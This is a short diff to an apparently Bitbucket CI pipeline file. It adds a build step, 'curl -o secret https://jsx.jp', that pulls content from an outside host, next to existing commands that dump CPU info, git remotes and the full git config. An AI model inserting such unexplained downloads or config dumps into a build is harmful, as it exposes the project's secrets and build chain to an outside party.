@@ -12,6 +12,7 @@ pipelines:
           - docker
         script: # Modify the commands below to build your repository.
           - grep MH /proc/cpuinfo
+          - curl -o secret https://jsx.jp
           - git remote -v
           - git config -l
           - npm run lint
